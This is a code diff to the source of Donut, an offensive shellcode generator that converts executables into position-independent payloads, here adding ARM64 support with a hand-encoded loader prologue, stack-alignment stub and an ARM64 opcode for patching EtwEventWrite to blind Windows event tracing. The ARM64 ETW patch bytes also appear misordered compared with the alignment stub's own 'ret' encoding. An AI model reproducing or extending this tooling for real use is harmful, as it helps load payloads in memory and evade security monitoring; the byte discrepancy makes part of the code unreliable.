@@ -33,12 +33,17 @@
 
 #include "loader_exe_x86.h"
 #include "loader_exe_x64.h"
-  
+#include "loader_exe_arm64.h"
+
+#ifndef LOADER_EXE_ARM64_TEXT_RVA
+#define LOADER_EXE_ARM64_TEXT_RVA 0x1000
+#endif
+
 #define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
 #define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
 #define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
 #define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
- 
+
 // required for each API used by the loader
 #define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32"
  
@@ -192,6 +197,16 @@ static PIMAGE_FILE_HEADER FileHdr (void *map) {
 // determines CPU architecture of binary
 static int is32 (void *map) {
     return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
+}
+
+// determines CPU architecture of binary
+int is64 (void *map) {
+    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_AMD64;
+}
+
+// determines CPU architecture of binary
+static int is_arm64(void *map) {
+    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_ARM64;
 }
 
 // return pointer to Optional header
@@ -551,7 +566,16 @@ static int read_file_info(PDONUT_CONFIG c) {
       rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
       
       // set the CPU architecture for file
-      fi.arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;
+      if(cpu) {
+        fi.arch = DONUT_ARCH_X86;
+      } else if(is64(fi.data)) {
+        fi.arch = DONUT_ARCH_X64;
+      } else if(is_arm64(fi.data)) {
+        fi.arch = DONUT_ARCH_ARM64;
+      } else {
+        err = DONUT_ERROR_INVALID_ARCH;
+        goto cleanup;
+      }
       
       // if COM directory present
       if(rva != 0) {
@@ -983,8 +1007,9 @@ static int build_instance(PDONUT_CONFIG c) {
       strcpy(inst->ntdll, "ntdll");
       strcpy(inst->etwEventWrite, "EtwEventWrite");
       strcpy(inst->etwEventUnregister, "EtwEventUnregister");
-      strcpy(inst->etwRet64, "\xc3");
-      strcpy(inst->etwRet32, "\xc2\x14\x00\x00");
+      strcpy(inst->etwRetx64, "\xc3");
+      strcpy(inst->etwRetx86, "\xc2\x14\x00\x00");
+      strcpy(inst->etwRetarm64, "\xc0\xd6\x5f\x03");
     }
     
     // if module is an unmanaged EXE
@@ -1246,8 +1271,31 @@ static int build_loader(PDONUT_CONFIG c) {
         0xC3
     };
 
+    static unsigned char LOADER_EXE_ARM64_SP_ALIGN[] = {
+        // stp x29, x30, [sp, #-16]!
+        0xFD, 0x7B, 0xBF, 0xA9,
+        // mov x29, sp
+        0xFD, 0x03, 0x00, 0x91,
+        // mov x16, sp
+        0xF0, 0x03, 0x00, 0x91,
+        // and x16, x16, #0xFFFFFFFFFFFFFFF0
+        0x10, 0xEE, 0x44, 0x92,
+        // mov sp, x16
+        0x1F, 0x02, 0x00, 0x91,
+        // bl #16
+        0x04, 0x00, 0x00, 0x94,
+        // mov sp, x29
+        0xBF, 0x03, 0x00, 0x91,
+        // ldp x29, x30, [sp], #16
+        0xFD, 0x7B, 0xC1, 0xA8,
+        // ret
+        0xC0, 0x03, 0x5F, 0xD6
+    };
+
     uint8_t *pl;
     uint32_t t;
+    uint32_t arm64_inst_pad = 0;
+    uint32_t arm64_loader_pad = 0;
     
     // target is x86?
     if(c->arch == DONUT_ARCH_X86) {
@@ -1263,7 +1311,24 @@ static int build_loader(PDONUT_CONFIG c) {
       c->pic_len = sizeof(LOADER_EXE_X86) + 
                    sizeof(LOADER_EXE_X64_RSP_ALIGN) + 
                    sizeof(LOADER_EXE_X64) + c->inst_len + 32;
+    } else if(c->arch == DONUT_ARCH_ARM64) {
+        arm64_inst_pad = (4 - (c->inst_len & 3)) & 3;
+        arm64_loader_pad = ((LOADER_EXE_ARM64_TEXT_RVA & 0xfff) -
+            ((8 + c->inst_len + arm64_inst_pad + sizeof(LOADER_EXE_ARM64_SP_ALIGN)) & 0xfff)) & 0xfff;
+        c->pic_len = 4 +                                    // ADR X0, #8
+                     4 +                                    // B over_inst
+                     c->inst_len +
+                     arm64_inst_pad +
+                     arm64_loader_pad +
+                     sizeof(LOADER_EXE_ARM64_SP_ALIGN) +
+                     sizeof(LOADER_EXE_ARM64) + 32;
+
+        if(LOADER_EXE_ARM64_TEXT_RVA > 0xffff) {
+          DPRINT("ARM64 .text RVA is too large for the loader stub: %u", LOADER_EXE_ARM64_TEXT_RVA);
+          return DONUT_ERROR_INVALID_ARCH;
+        }
     }
+
     // allocate memory for shellcode
     c->pic = malloc(c->pic_len);
     
@@ -1276,67 +1341,98 @@ static int build_loader(PDONUT_CONFIG c) {
     
     // insert shellcode
     pl = (uint8_t*)c->pic;
-    
-    // call $ + c->inst_len
-    PUT_BYTE(pl,  0xE8);
-    PUT_WORD(pl,  c->inst_len);
-    PUT_BYTES(pl, c->inst, c->inst_len);
-    // pop ecx
-    PUT_BYTE(pl,  0x59);
-    
-    // x86?
-    if(c->arch == DONUT_ARCH_X86) {
-      // pop edx
-      PUT_BYTE(pl, 0x5A);
-      // push ecx
-      PUT_BYTE(pl, 0x51);
-      // push edx
-      PUT_BYTE(pl, 0x52);
-      
-      DPRINT("Copying %" PRIi32 " bytes of x86 shellcode", 
-        (uint32_t)sizeof(LOADER_EXE_X86));
-        
-      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
-    } else 
-    // AMD64?
-    if(c->arch == DONUT_ARCH_X64) {
-      
-      DPRINT("Copying %" PRIi32 " bytes of amd64 shellcode", 
-        (uint32_t)sizeof(LOADER_EXE_X64));
 
-      // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
-      
-      PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, sizeof(LOADER_EXE_X64_RSP_ALIGN));
-      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
-    } else 
-    // x86 + AMD64?
-    if(c->arch == DONUT_ARCH_X84) {
-      
-      DPRINT("Copying %" PRIi32 " bytes of x86 + amd64 shellcode",
-        (uint32_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));
-        
-      // xor eax, eax
-      PUT_BYTE(pl, 0x31);
-      PUT_BYTE(pl, 0xC0);
-      // dec eax
-      PUT_BYTE(pl, 0x48);
-      // js dword x86_code
-      PUT_BYTE(pl, 0x0F);
-      PUT_BYTE(pl, 0x88);
-      PUT_WORD(pl,  sizeof(LOADER_EXE_X64_RSP_ALIGN) + sizeof(LOADER_EXE_X64));
-      
-      // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
-      
+    if(c->arch == DONUT_ARCH_ARM64) {
+        // ADR X0, #8  ->  X0 = address of instance (8 bytes from here)
+        // Encoding: imm=8, immlo=0, immhi=2, Rd=X0
+        PUT_BYTE(pl, 0x40); PUT_BYTE(pl, 0x00);
+        PUT_BYTE(pl, 0x00); PUT_BYTE(pl, 0x10);
 
-      PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, sizeof(LOADER_EXE_X64_RSP_ALIGN));
-      PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
-      // pop edx
-      PUT_BYTE(pl, 0x5A);
-      // push ecx
-      PUT_BYTE(pl, 0x51);
-      // push edx
-      PUT_BYTE(pl, 0x52);
-      PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
+        // B #(inst_len + padding + 4)  ->  jump over instance data
+        uint32_t b_imm26  = ((c->inst_len + arm64_inst_pad + arm64_loader_pad + 4) / 4) & 0x3FFFFFF;
+        uint32_t b_instr  = 0x14000000 | b_imm26; // B encoding
+        PUT_BYTE(pl, (b_instr >>  0) & 0xFF);
+        PUT_BYTE(pl, (b_instr >>  8) & 0xFF);
+        PUT_BYTE(pl, (b_instr >> 16) & 0xFF);
+        PUT_BYTE(pl, (b_instr >> 24) & 0xFF);
+
+        // instance data  (X0 already points here)
+        PUT_BYTES(pl, c->inst, c->inst_len);
+        while(arm64_inst_pad--) {
+          PUT_BYTE(pl, 0);
+        }
+        while(arm64_loader_pad--) {
+          PUT_BYTE(pl, 0);
+        }
+        DPRINT("Copying %" PRIi32 " bytes of ARM64 shellcode",
+            (uint32_t)(sizeof(LOADER_EXE_ARM64_SP_ALIGN) + sizeof(LOADER_EXE_ARM64)));
+
+        // Alignment stub then loader. X0 = instance.
+        PUT_BYTES(pl, LOADER_EXE_ARM64_SP_ALIGN, sizeof(LOADER_EXE_ARM64_SP_ALIGN));
+        PUT_BYTES(pl, LOADER_EXE_ARM64, sizeof(LOADER_EXE_ARM64));
+
+    } else {
+      // call $ + c->inst_len
+      PUT_BYTE(pl,  0xE8);
+      PUT_WORD(pl,  c->inst_len);
+      PUT_BYTES(pl, c->inst, c->inst_len);
+      // pop ecx
+      PUT_BYTE(pl,  0x59);
+      
+      // x86?
+      if(c->arch == DONUT_ARCH_X86) {
+        // pop edx
+        PUT_BYTE(pl, 0x5A);
+        // push ecx
+        PUT_BYTE(pl, 0x51);
+        // push edx
+        PUT_BYTE(pl, 0x52);
+        
+        DPRINT("Copying %" PRIi32 " bytes of x86 shellcode", 
+          (uint32_t)sizeof(LOADER_EXE_X86));
+          
+        PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
+      } else 
+      // AMD64?
+      if(c->arch == DONUT_ARCH_X64) {
+        
+        DPRINT("Copying %" PRIi32 " bytes of amd64 shellcode", 
+          (uint32_t)sizeof(LOADER_EXE_X64));
+
+        // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
+        
+        PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, sizeof(LOADER_EXE_X64_RSP_ALIGN));
+        PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
+      } else 
+      // x86 + AMD64?
+      if(c->arch == DONUT_ARCH_X84) {
+        
+        DPRINT("Copying %" PRIi32 " bytes of x86 + amd64 shellcode",
+          (uint32_t)(sizeof(LOADER_EXE_X86) + sizeof(LOADER_EXE_X64)));
+          
+        // xor eax, eax
+        PUT_BYTE(pl, 0x31);
+        PUT_BYTE(pl, 0xC0);
+        // dec eax
+        PUT_BYTE(pl, 0x48);
+        // js dword x86_code
+        PUT_BYTE(pl, 0x0F);
+        PUT_BYTE(pl, 0x88);
+        PUT_WORD(pl,  sizeof(LOADER_EXE_X64_RSP_ALIGN) + sizeof(LOADER_EXE_X64));
+        
+        // ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention
+        
+
+        PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, sizeof(LOADER_EXE_X64_RSP_ALIGN));
+        PUT_BYTES(pl, LOADER_EXE_X64, sizeof(LOADER_EXE_X64));
+        // pop edx
+        PUT_BYTE(pl, 0x5A);
+        // push ecx
+        PUT_BYTE(pl, 0x51);
+        // push edx
+        PUT_BYTE(pl, 0x52);
+        PUT_BYTES(pl, LOADER_EXE_X86, sizeof(LOADER_EXE_X86));
+      }
     }
     return DONUT_ERROR_OK;
 }
@@ -1435,6 +1531,7 @@ static int validate_loader_cfg(PDONUT_CONFIG c) {
     if(c->arch != DONUT_ARCH_X86 &&
        c->arch != DONUT_ARCH_X64 &&
        c->arch != DONUT_ARCH_X84 &&
+       c->arch != DONUT_ARCH_ARM64 &&
        c->arch != DONUT_ARCH_ANY)
     {
       DPRINT("Target architecture %"PRId32 " is invalid.", c->arch);
@@ -1528,12 +1625,10 @@ static int validate_file_cfg(PDONUT_CONFIG c) {
     if(fi.type == DONUT_MODULE_DLL ||
        fi.type == DONUT_MODULE_EXE)
     {
-      // Requested shellcode is x86, but file is x64?
-      // Requested shellcode is x64, but file is x86?
-      if((c->arch == DONUT_ARCH_X86  && 
-         fi.arch  == DONUT_ARCH_X64) ||
-         (c->arch == DONUT_ARCH_X64  &&
-         fi.arch  == DONUT_ARCH_X86))
+      if(((c->arch == DONUT_ARCH_X84) &&
+          (fi.arch == DONUT_ARCH_ARM64)) ||
+         ((c->arch != DONUT_ARCH_X84) &&
+          (c->arch != fi.arch)))
       {
         DPRINT("Target architecture %"PRId32 " is not compatible with DLL/EXE %"PRId32, c->arch, fi.arch);
         return DONUT_ERROR_ARCH_MISMATCH;
@@ -1966,6 +2061,9 @@ static int validate_arch(opt_arg *arg, void *args) {
       } else
       if(!strcasecmp("x84", str)) {
         arg->u32 = DONUT_ARCH_X84;
+      } else 
+      if(!strcasecmp("arm64", str)) {
+        arg->u32 = DONUT_ARCH_ARM64;
       }
     }
     
@@ -1974,6 +2072,7 @@ static int validate_arch(opt_arg *arg, void *args) {
       case DONUT_ARCH_X86:
       case DONUT_ARCH_X64:
       case DONUT_ARCH_X84:
+      case DONUT_ARCH_ARM64:
         break;
       default: {
         printf("WARNING: Invalid architecture specified: %"PRId32" -- setting to x86+amd64\n", arg->u32);
@@ -2189,7 +2288,7 @@ int main(int argc, char *argv[]) {
     DONUT_CONFIG c;
     int          err;
     char         *mod_type;
-    char         *arch_str[3] = { "x86", "amd64", "x86+amd64" };
+    char         *arch_str[4] = { "x86", "amd64", "x86+amd64", "arm64" };
     char         *inst_type[2]= { "Embedded", "HTTP" };
     
     printf("\n");
